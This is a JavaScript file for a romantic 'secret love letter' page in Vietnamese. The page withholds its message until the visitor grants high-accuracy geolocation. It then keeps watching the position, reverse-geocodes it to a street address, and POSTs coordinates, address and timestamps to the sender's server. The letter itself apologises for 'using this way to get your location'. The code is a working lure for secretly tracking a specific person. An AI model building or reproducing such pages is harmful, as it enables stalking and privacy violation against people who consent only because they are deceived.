// Base Location (Default: Hà Nội - 21.028511, 105.804817)
const MY_BASE_LOCATION = {
  lat: 21.028511,
  lng: 105.804817,
  name: 'Hà Nội'
};

// DOM Elements
const lockScreen = document.getElementById('lock-screen');
const secretContent = document.getElementById('secret-content');
const btnUnlock = document.getElementById('btn-unlock');
const btnRetry = document.getElementById('btn-retry');
const deniedWarning = document.getElementById('denied-warning');
const warningText = document.getElementById('warning-text');
const typewriterElement = document.getElementById('typewriter-text');
const currentYearSpan = document.getElementById('current-year');

// Set Current Year
if (currentYearSpan) {
  currentYearSpan.textContent = new Date().getFullYear();
}

// Spawning Floating Hearts in Background
function createFloatingHearts() {
  const container = document.getElementById('floating-hearts');
  if (!container) return;

  const heartIcons = ['💖', '💕', '💗', '💓', '🌸', '✨'];
  for (let i = 0; i < 20; i++) {
    const heart = document.createElement('div');
    heart.className = 'heart-particle';
    heart.textContent = heartIcons[Math.floor(Math.random() * heartIcons.length)];
    heart.style.left = `${Math.random() * 100}%`;
    heart.style.animationDuration = `${4 + Math.random() * 6}s`;
    heart.style.animationDelay = `${Math.random() * 5}s`;
    heart.style.fontSize = `${16 + Math.random() * 18}px`;
    container.appendChild(heart);
  }
}
createFloatingHearts();

// Haversine Formula for Distance Calculation (in kilometers)
function calculateDistance(lat1, lon1, lat2, lon2) {
  const R = 6371; // Radius of the earth in km
  const dLat = (lat2 - lat1) * (Math.PI / 180);
  const dLon = (lon2 - lon1) * (Math.PI / 180);
  const a =
    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos(lat1 * (Math.PI / 180)) * Math.cos(lat2 * (Math.PI / 180)) *
    Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return Math.round(R * c); // Distance in km
}

// Typewriter Effect for Love Letter
function startTypewriter(text, speed = 50) {
  typewriterElement.textContent = '';
  let i = 0;
  function type() {
    if (i < text.length) {
      typewriterElement.textContent += text.charAt(i);
      i++;
      setTimeout(type, speed);
    }
  }
  type();
}

// Reverse Geocoding via Nominatim API
async function reverseGeocode(lat, lon) {
  try {
    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`, {
      headers: {
        'Accept-Language': 'vi'
      }
    });
    if (!response.ok) throw new Error('Geocoding failed');
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Reverse geocoding error:', error);
    return null;
  }
}

// Send Location to Server API
async function sendLocationPayload(payload) {
  try {
    await fetch('/api/location', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    console.log('Location payload sent successfully.');
  } catch (err) {
    console.error('Failed to send location payload:', err);
  }
}

// Leaflet Map Variable
let loveMap = null;

function renderLoveMap(loverLat, loverLng, loverAddress) {
  if (loveMap) {
    loveMap.remove();
  }

  // Initialize Map
  loveMap = L.map('map').setView([loverLat, loverLng], 12);

  // Add OpenStreetMap Tile Layer
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    maxZoom: 19,
    attribution: '© OpenStreetMap contributors'
  }).addTo(loveMap);

  // Custom Heart Icon for Lover
  const loverHeartIcon = L.divIcon({
    html: '<div style="font-size: 32px; color: #ff2a55; filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3));">💖</div>',
    className: 'custom-heart-icon',
    iconSize: [32, 32],
    iconAnchor: [16, 16]
  });

  // Custom Home Icon for Base Location
  const myHomeIcon = L.divIcon({
    html: '<div style="font-size: 30px; color: #4f46e5; filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3));">🏠</div>',
    className: 'custom-home-icon',
    iconSize: [30, 30],
    iconAnchor: [15, 15]
  });

  // Add Markers
  const loverMarker = L.marker([loverLat, loverLng], { icon: loverHeartIcon })
    .addTo(loveMap)
    .bindPopup(`<b>Em ở đây nè 💕</b><br>${loverAddress || ''}`)
    .openPopup();

  const myMarker = L.marker([MY_BASE_LOCATION.lat, MY_BASE_LOCATION.lng], { icon: myHomeIcon })
    .addTo(loveMap)
    .bindPopup(`<b>Anh ở đây (${MY_BASE_LOCATION.name}) 🏡</b>`);

  // Draw Dashed Love Line Connecting the Two Locations
  const latlngs = [
    [loverLat, loverLng],
    [MY_BASE_LOCATION.lat, MY_BASE_LOCATION.lng]
  ];

  const polyline = L.polyline(latlngs, {
    color: '#ff4e72',
    weight: 4,
    dashArray: '8, 12',
    lineCap: 'round'
  }).addTo(loveMap);

  // Fit Map Bounds to Show Both Points
  const bounds = L.latLngBounds(latlngs);
  loveMap.fitBounds(bounds, { padding: [50, 50] });
}

// Request Location & Handle Permission with Progressive GPS Accuracy Refining
let watchId = null;
let bestAccuracy = Infinity;

function requestLocationAndUnlock() {
  if (!navigator.geolocation) {
    showDeniedWarning('Trình duyệt của em không hỗ trợ tính năng định vị.');
    return;
  }

  btnUnlock.disabled = true;
  btnUnlock.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Đang tìm vị trí chính xác nhất...';

  // Clear existing watch if any
  if (watchId !== null) {
    navigator.geolocation.clearWatch(watchId);
    watchId = null;
  }

  bestAccuracy = Infinity;

  // Use watchPosition to continuously get more accurate GPS fixes
  watchId = navigator.geolocation.watchPosition(
    async (position) => {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const accuracy = Math.round(position.coords.accuracy);
      const timestamp = new Date(position.timestamp).toISOString();

      console.log(`📍 Received location fix: ${lat}, ${lng} (Accuracy: ±${accuracy}m)`);

      // Only update UI if accuracy improves or this is the first fix
      if (accuracy <= bestAccuracy || bestAccuracy === Infinity) {
        bestAccuracy = accuracy;

        // 1. Calculate Distance
        const distance = calculateDistance(lat, lng, MY_BASE_LOCATION.lat, MY_BASE_LOCATION.lng);
        document.getElementById('distance-number').textContent = distance;

        // 2. Update Telemetry
        document.getElementById('val-coords').textContent = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
        document.getElementById('val-accuracy').textContent = `±${accuracy} m`;
        document.getElementById('val-time').textContent = new Date().toLocaleTimeString('vi-VN');

        // 3. Unlock UI Animation if locked
        if (!lockScreen.classList.contains('hidden')) {
          lockScreen.classList.add('hidden');
          secretContent.classList.remove('hidden');

          if (typeof confetti === 'function') {
            confetti({
              particleCount: 100,
              spread: 70,
              origin: { y: 0.6 }
            });
          }

          const letterText = `Gửi đồ cứng đầu! 💕\n\nAnh xin lỗi vì đã dùng cách này để lấy vị trí của em, nhưng em yên tâm, chỉ khi nào em đồng ý thì anh mới xuất hiện trước mặt em.\n\nCơ mà radar tình yêu báo em đang cách anh đúng ${distance}km nha! Khoảng cách này xa đấy, nhưng em thèm trà sữa hay thèm ôm thì cứ báo một tiếng, anh phi ship thần tốc sang tận nhà liền 🧋🤪💖!`;
          startTypewriter(letterText);
        }

        // 4. Reverse Geocode
        const geoData = await reverseGeocode(lat, lng);
        let addressString = 'Chưa xác định';
        let cityName = 'Vị trí của em';

        if (geoData && geoData.address) {
          addressString = geoData.display_name || 'Vị trí của em';
          cityName = geoData.address.city || geoData.address.town || geoData.address.state || geoData.address.suburb || 'Vị trí của em';
        }

        document.getElementById('val-address').textContent = addressString;
        document.getElementById('lover-city').textContent = cityName;
        document.getElementById('my-city').textContent = MY_BASE_LOCATION.name;

        // 5. Update Map
        renderLoveMap(lat, lng, addressString);

        // 6. Send Location Payload to Backend Server
        sendLocationPayload({
          latitude: lat,
          longitude: lng,
          accuracy: accuracy,
          address: addressString,
          timestamp: timestamp
        });
      }
    },
    (error) => {
      btnUnlock.disabled = false;
      btnUnlock.innerHTML = '<i class="fa-solid fa-key"></i> Mở Khóa Món Quà Bí Mật 🎁';

      let errorMessage = 'Ôi! Em cần cho phép vị trí để mở khóa bức thư bí mật này nhé! 🔒💕';
      if (error.code === error.PERMISSION_DENIED) {
        errorMessage = 'Em đã chọn từ chối cấp vị trí. Hãy bật lại quyền vị trí trong cài đặt trình duyệt để xem nội dung bức thư nhé! 🔒💕';
      } else if (error.code === error.TIMEOUT) {
        errorMessage = 'Hết thời gian chờ định vị. Vui lòng bấm thử lại giúp anh nhé! ⏳';
      }

      showDeniedWarning(errorMessage);
    },
    {
      enableHighAccuracy: true,
      timeout: 20000,
      maximumAge: 0
    }
  );
}

function showDeniedWarning(msg) {
  deniedWarning.classList.remove('hidden');
  warningText.textContent = msg;
}

// Event Listeners
btnUnlock.addEventListener('click', requestLocationAndUnlock);
btnRetry.addEventListener('click', () => {
  deniedWarning.classList.add('hidden');
  requestLocationAndUnlock();
});

// Copy Coordinates Button
document.getElementById('btn-copy').addEventListener('click', () => {
  const coordsText = document.getElementById('val-coords').textContent;
  navigator.clipboard.writeText(coordsText).then(() => {
    alert('Đã sao chép tọa độ: ' + coordsText);
  });
});

// Share Button
document.getElementById('btn-share').addEventListener('click', () => {
  const coordsText = document.getElementById('val-coords').textContent;
  const shareData = {
    title: 'Bản Đồ Tình Yêu 💕',
    text: `Chúng mình đang cách nhau ${document.getElementById('distance-number').textContent}km! Tọa độ: ${coordsText}`,
    url: window.location.href
  };

  if (navigator.share) {
    navigator.share(shareData);
  } else {
    alert('Liên kết trang web: ' + window.location.href);
  }
});
